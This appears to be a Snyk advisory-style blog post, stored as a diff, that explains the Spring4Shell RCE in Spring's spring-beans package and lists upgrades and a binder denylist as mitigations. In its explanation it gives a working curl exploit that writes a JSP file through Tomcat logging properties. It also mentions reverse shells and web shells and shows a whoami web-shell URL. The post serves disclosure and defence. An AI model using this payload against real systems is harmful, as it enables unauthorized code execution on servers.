@@ -1,0 +1,79 @@
+
+On March 30, 2022, a critical remote code execution (RCE) vulnerability was found in the Spring Framework. More specifically, it is part of the spring-beans package, a transitive dependency in both spring-webmvc and spring-webflux. This vulnerability is another example of why securing the software supply chain is important to open source.
+Security resources like Lunasec, Rapid7 and Praetorian confirmed that the vulnerability is real, and in the meantime Spring has already released a new version that mitigates this problem, so we recommend updating. While Spring4Shell does not appear to have the same impact as the recent Log4Shell vulnerability, it should still be evaluated and prioritized by every organization using the Spring Framework. In this post, we’ll explore how the RCE works.
+Explaining Spring4Shell
+If we have a controller with a request mapping loaded into memory, we are already vulnerable to this issue. Below, you see our GreetingController with a PostMapping to /greeting. When we call our application in, for instance, Tomcat at http://mydomain/myapp/greeting it tries to transform the input to a POJO (Plain Old Java Object) which, in our case, is the Greeting object.
+1@Controller
+2public class GreetingController {
+3
+4  @PostMapping("/greeting")
+5  public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) {
+6     model.addAttribute("greeting", greeting);
+7     return "result";
+8  }
+9
+10}
+However, because Spring uses serialization under the hood to map these values to the Java object, it is possible to also set other values. After some exploration, it turns out that you are able to set properties of a class. This is interesting if you run on Tomcat.
+To show this in action, we can use the following curl to create a rce.jsp file through some logging properties of the class.
+1curl -X POST \
+2 -H "pre:<%" \
+3 -H "post:;%>" \
+4 -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i out.println("HACKED" + (2 + 5))%{post}i' \
+5 -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
+6 -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/myapp' \
+7 -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
+8 -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
+9 http://mydomain/myapp/greeting
+Everything set in the pattern will end up as content in the file. With some clever escaping and the use of headers, our team was able to create a JSP file on the Tomcat server containing the simple body <% out.println(“HACKED”); %>. This file was now available at /myapp/rce.jsp.
+The full POC created by Kirill Efimov and Aviad Hahami from the Snyk Security Research team is available on GitHub
+If we can evaluate a simple out.println, we are also able to create JSP files containing terminal commands that create reverse shell access using Runtime.exec(). Alternatively, we can create a nice web shell interface using the JSP capabilities.
+A similar exploit mentioned by many other blogs is to create a JSP that has the capabilities to execute a command. This Python script creates the appropriate request with the needed headers for you. After executing this script on our demo application, we are able to execute the whoami command like this: [http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami](http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami).
+Who is vulnerable?
+As things are currently evolving quickly, we can only say what we know now.
+For affected versions of spring-beans, it looks like this vulnerability is only effective if you use JDK 9 and up. The introduction of JDK 9 pretty much bypassed an old problem CVE-2010-1622.
+As a lot of Java developers have already moved away to later versions of Java past 8 and with the tremendous use of the Spring Framework, we believe a lot of Java applications might be vulnerable to this issue.
+There are multiple ways to solve this problem. The Spring maintainers released a new version of the framework. So the best advice is to update to version 5.3.18 or 5.2.20 of the Spring Framework. According to our security team, you only have to update the `spring-bean` package to the latest version, but updating the whole framework makes more sense. If you use Spring Boot, release 2.6.6 or 2.5.12 integrates the updated Spring Framework.
+If you cannot update to a newer version of Spring, it might be feasible for you to downgrade your Java version to Java 8.
+Another option is to create an InitBinder either in the controller or as a separate ControllerAdvice like below.
+1@ControllerAdvice
+2@Order(10000)
+3public class BinderControllerAdvice {
+4
+5  @InitBinder
+6  public void setAllowedFields(WebDataBinder dataBinder) {
+7    String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
+8    dataBinder.setDisallowedFields(denylist);
+9  }
+10}
+But be aware that this is not a final solution. Creating a blocklist like this is not considered a good security practice, but it might buy you some time. The maintainers of the spring framework suggest to create a RequestMappingHandlerAdapter to update the WebDataBinder at the end after all other initialization in their blog post.
+Depending on frameworks and libraries
+Spring4Shell shows once again that we depend heavily on open source frameworks and libraries. However, when a security vulnerability such as this one or the recent Log4Shell RCE, you want to be aware of this so you can mitigate it instantly.
+Snyk can help you be on top of this by routinely scanning your applications. Snyk alerts you and your team when new vulnerabilities are detected, providing recommended next steps to keep your applications secure.
+On a final note, zero-days like this remind us why it’s important to stay up to date with the latest versions of libraries. If you’re current, you can more easily apply updates, rebuild, and re-release quickly.
+Get started in capture the flag
+Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand.
+
+spring-beans
+spring-webmvc
+spring-webflux
+GreetingController
+PostMapping
+/greeting
+http://mydomain/myapp/greeting
+Greeting
+curl
+rce.jsp
+<% out.println(“HACKED”); %>
+/myapp/rce.jsp
+out.println
+Runtime.exec()
+whoami
+[http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami](http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami)
+5.3.18
+5.2.20
+2.6.6
+2.5.12
+InitBinder
+ControllerAdvice
+RequestMappingHandlerAdapter
+WebDataBinder
